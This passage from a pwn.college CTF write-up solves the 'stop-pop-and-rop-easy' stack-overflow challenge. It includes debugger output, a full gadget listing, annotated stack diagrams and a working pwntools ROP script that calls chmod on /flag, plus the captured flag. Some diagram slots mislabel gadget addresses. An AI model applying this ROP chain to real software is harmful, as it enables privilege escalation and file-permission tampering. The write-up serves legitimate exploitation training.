   0x0000000000402007 <+418>:   nop
   0x0000000000402008 <+419>:   leave
   0x0000000000402009 <+420>:   ret
End of assembler dump.
```

```
pwndbg> break *(challenge+263)
Breakpoint 1 at 0x401f6c
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop-easy 
###
### Welcome to /challenge/stop-pop-and-rop-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffd7804eba0.


Breakpoint 1, 0x0000000000401f6c in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
 RBX  0x4020d0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
 R8   0x39
 R9   0x39
 R10  0x403422 ◂— 0x65520000000a0a2e /* '.\n\n' */
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7ffd7804ed50 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd7804ec30 —▸ 0x7ffd7804ec60 ◂— 0
 RSP  0x7ffd7804eb80 ◂— 0
 RIP  0x401f6c (challenge+263) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x401f6c <challenge+263>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
        nbytes: 0x1000
 
   0x401f71 <challenge+268>    mov    dword ptr [rbp - 4], eax
   0x401f74 <challenge+271>    mov    eax, dword ptr [rbp - 4]
   0x401f77 <challenge+274>    cdqe   
   0x401f79 <challenge+276>    lea    rcx, [rbp - 0x90]
   0x401f80 <challenge+283>    mov    rdx, qword ptr [rip + 0x3151]     RDX, [rp_]
   0x401f87 <challenge+290>    sub    rcx, rdx
   0x401f8a <challenge+293>    mov    rdx, rcx
   0x401f8d <challenge+296>    add    rax, rdx
   0x401f90 <challenge+299>    shr    rax, 3
   0x401f94 <challenge+303>    mov    rdx, rax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd7804eb80 ◂— 0
01:0008│-0a8     0x7ffd7804eb88 —▸ 0x7ffd7804ed68 —▸ 0x7ffd7804f67c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0a0     0x7ffd7804eb90 —▸ 0x7ffd7804ed58 —▸ 0x7ffd7804f65b ◂— '/challenge/stop-pop-and-rop-easy'
03:0018│-098     0x7ffd7804eb98 ◂— 0x1fb40c723
04:0020│ rax rsi 0x7ffd7804eba0 ◂— 0xd68 /* 'h\r' */
05:0028│-088     0x7ffd7804eba8 —▸ 0x752efb2af951 (_IO_do_write+177) ◂— mov r13, rax
06:0030│-080     0x7ffd7804ebb0 ◂— 0
07:0038│-078     0x7ffd7804ebb8 ◂— 0xa /* '\n' */
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401f6c challenge+263
   1         0x4020af main+165
   2   0x752efb243083 __libc_start_main+243
   3         0x4011de _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffd7804eba0`
- [ ] Location of stored return address to `main()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd7804ec40:
 rip = 0x401f6c in challenge; saved rip = 0x4020af
 called by frame at 0x7ffd7804ec70
 Arglist at 0x7ffd7804ec30, args: 
 Locals at 0x7ffd7804ec30, Previous frame's sp is 0x7ffd7804ec40
 Saved registers:
  rbp at 0x7ffd7804ec30, rip at 0x7ffd7804ec38
```

- [x] Location of buffer: `0x7ffd7804eba0`
- [x] Location of stored return address to `main()`: `0x7ffd7804ec38`

Let's get the offset.

```
pwndbg> p/d 0x7ffd7804ec38 - 0x7ffd7804eba0
$1 = 152
```

Now let's look at the ROP gadgets that we have available.

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:~$ ROPgadget --binary /challenge/stop-pop-and-rop-easy 
Gadgets information
============================================================
0x0000000000401f1d : adc al, 0 ; add al, ch ; jmp 0x401f14
0x0000000000401687 : adc eax, 0xc9fffffb ; ret
0x00000000004011dd : add ah, dh ; nop ; endbr64 ; ret
0x0000000000401487 : add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401f6b : add al, ch ; iretd
0x0000000000401f1f : add al, ch ; jmp 0x401f14
0x000000000040120b : add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401ec1 : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401f86 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040156f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401e39 : add byte ptr [rax - 0x39], cl ; loopne 0x401e9e ; ret
0x0000000000401e49 : add byte ptr [rax - 0x39], cl ; rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401504 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401f69 : add byte ptr [rax], al ; add al, ch ; iretd
0x0000000000401502 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x00000000004012f2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x000000000040213c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004012f4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401574 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x000000000040163f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x00000000004020bc : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004020bd : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040127a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040213e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004012f6 : add byte ptr [rax], al ; jmp 0x401470
0x0000000000401576 : add byte ptr [rax], al ; jmp 0x401608
0x0000000000401641 : add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bf : add byte ptr [rax], al ; jmp 0x4016e6
0x00000000004020be : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401279 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011db : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004020bf : add cl, cl ; ret
0x000000000040120a : add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040127c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ef : add eax, 0x3db8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401277 : add eax, 0x3e2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401e47 : add eax, 0xc74800c3 ; rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401f93 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401f1c : and byte ptr [rax + rax], dl ; add al, ch ; jmp 0x401f14
0x00000000004016f7 : call qword ptr [rax + 0xff3c3c9]
0x000000000040148c : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401573 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401e25 : clc ; pop rdx ; ret
0x00000000004016bc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401293 : cli ; jmp 0x401220
0x00000000004011e3 : cli ; ret
0x000000000040214b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004012f1 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401489 : cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040168a : dec ecx ; ret
0x0000000000401290 : endbr64 ; jmp 0x401220
0x00000000004011e0 : endbr64 ; ret
0x000000000040211c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040163e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004011de : hlt ; nop ; endbr64 ; ret
0x00000000004016b9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x000000000040163b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004013dd : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401205 : je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401247 : je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401294 : jmp 0x401220
0x00000000004012f8 : jmp 0x401470
0x0000000000401578 : jmp 0x401608
0x0000000000401643 : jmp 0x40166f
0x0000000000401629 : jmp 0x401675
0x00000000004014cf : jmp 0x40168b
0x00000000004016c1 : jmp 0x4016e6
0x0000000000401f21 : jmp 0x401f14
0x000000000040100b : jmp 0x4840104f
0x000000000040120c : jmp rax
0x000000000040148f : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040168b : leave ; ret
0x000000000040120d : loopne 0x401275 ; nop ; ret
0x0000000000401e3d : loopne 0x401e9e ; ret
0x0000000000401208 : mov byte ptr [rax + 0x40], dl ; add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401276 : mov byte ptr [rip + 0x3e2b], 1 ; pop rbp ; ret
0x0000000000401e5b : mov dword ptr [rbp - 0x40], 0xc35a41 ; nop ; pop rbp ; ret
0x000000000040163c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40166f
0x00000000004016ba : mov dword ptr [rbp - 4], 0 ; jmp 0x4016e6
0x0000000000401571 : mov dword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004020bb : mov eax, 0 ; leave ; ret
0x0000000000401207 : mov edi, 0x405088 ; jmp rax
0x0000000000401570 : mov qword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004011df : nop ; endbr64 ; ret
0x00000000004016f8 : nop ; leave ; ret
0x0000000000401e10 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e11 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e12 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e13 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e14 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e15 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401e16 : nop ; nop ; pop rbp ; ret
0x0000000000401e17 : nop ; pop rbp ; ret
0x000000000040120f : nop ; ret
0x000000000040128c : nop dword ptr [rax] ; endbr64 ; jmp 0x401220
0x0000000000401206 : or dword ptr [rdi + 0x405088], edi ; jmp rax
0x0000000000401e5e : pop r10 ; ret
0x000000000040212c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401493 : pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040212e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401495 : pop r13 ; pop rbp ; ret
0x0000000000402130 : pop r14 ; pop r15 ; ret
0x0000000000402132 : pop r15 ; ret
0x0000000000401e4e : pop r8 ; ret
0x0000000000401e56 : pop r9 ; ret
0x0000000000401e2e : pop rax ; ret
0x000000000040212b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040212f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401496 : pop rbp ; pop rbp ; ret
0x000000000040127d : pop rbp ; ret
0x0000000000401492 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401e57 : pop rcx ; ret
0x0000000000401e3e : pop rdi ; ret
0x0000000000401e26 : pop rdx ; ret
0x0000000000402131 : pop rsi ; pop r15 ; ret
0x0000000000401e36 : pop rsi ; ret
0x000000000040212d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401494 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401209 : push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401f83 : push rcx ; xor dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040101a : ret
0x00000000004014ff : ret 0x40be
0x0000000000401f96 : ret 0x458b
0x0000000000401ec4 : ret 0x8948
0x0000000000401fe9 : ret 0x8b48
0x00000000004014af : ret 0x8be
0x0000000000401f8c : retf 0x148
0x0000000000401e4c : rol byte ptr [r9 + 0x58], 1 ; ret
0x0000000000401e4d : rol byte ptr [rcx + 0x58], 1 ; ret
0x0000000000401fe6 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000401f89 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401484 : sbb byte ptr [rbx], 0 ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401485 : sbb eax, dword ptr [rax] ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401278 : sub edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040214d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040214c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401e46 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401203 : test eax, eax ; je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401245 : test eax, eax ; je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000401ebf : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401f84 : xor dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148

Unique gadgets found: 158
```

Using the information we have, and some of these ROP gadgets, we can craft an exploit which uses `chmod` to change files permissions.

### ROP chain: ret2stack

This is the ROP chain that we will be performing.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804eba8 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec30 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec38 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec40 │  00 00 7f fd 78 04 eb a0  │ --> ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec48 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rsi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec58 │  00 00 00 00 00 40 1e 3e  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec60 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rax ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd7804eba0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd7804ec68 │  00 00 00 00 00 40 1e 3e  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd7804ec70 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎ 

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> syscall
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initilaize values
pop_rax = 0x401e2e
pop_rdi = 0x401e3e
pop_rsi = 0x401e36
syscall = 0x401e46
buffer_addr = 0x7ffd7804eba0
ret_addr = 0x7ffd7804ec38

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop-easy')

# Extract the actual buffer address for that specific run
p.recvuntil(b"located at: ")
leak_str = p.recvline().strip().decode().strip('.')
buffer_addr = int(leak_str, 16)

flag_string = b"/flag\x00\x00\x00"

payload = flat(
    flag_string,
    b"A" * (offset - len(flag_string)),

    # chmod("/flag", 0o777)
    pop_rdi, buffer_addr,
    pop_rsi, 0o777,
    pop_rax, 90,
    syscall
)

p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:/$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop-easy': pid 2727
[*] Leaked Buffer Address: 0x7fffe80e11f0
[*] Switching to interactive mode

[*] Process '/challenge/stop-pop-and-rop-easy' stopped with exit code -11 (SIGSEGV) (pid 2727)
Received 209 bytes! This is potentially 7 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 8 gadgets of ROP chain at 0x7fffe80e1288.
| 0x0000000000401e3e: pop rdi ; ret  ; 
| 0x00007fffe80e11f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 41 41 41 41 41 41 41 41 
| 0x0000000000401e36: pop rsi ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x0000000000401e2e: pop rax ; ret  ; 
| 0x000000000000005a: (UNMAPPED MEMORY)
| 0x0000000000401e46: syscall  ; ret  ; 
| 0x0000780ea44e260a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; or al, 8 ; 

Leaving!
[*] Got EOF while reading in interactive
$ 
```

```
hacker@return-oriented-programming~stop-pop-and-rop-easy:/$ cat /flag 
pwn.college{AhCJW0hDJerngeygt7SEo49RF7a.01N0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP (Hard)

```
hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ /challenge/stop-pop-and-rop-hard 
###
